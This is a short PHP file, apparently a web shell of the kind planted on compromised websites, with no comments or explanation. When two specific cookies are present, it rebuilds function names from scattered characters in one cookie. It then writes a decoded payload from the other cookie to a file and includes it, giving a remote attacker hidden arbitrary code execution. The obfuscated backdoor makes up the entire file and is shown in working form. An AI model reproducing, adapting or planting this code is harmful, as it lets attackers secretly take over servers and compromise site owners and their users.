<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[20])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 8;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[20][$n];
        if (!$c[20][$n + 1]) {
            if (!$c[20][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 8 + 1;
    }
    $k = $p[2]() . $p[14];
    if (!$p[24]($k)) {
        $n = $p[6]($k, $p[19]);
        $p[26]($n, $p[7] . $p[5]($p[3]($c[3])));
    }
    include($k);
}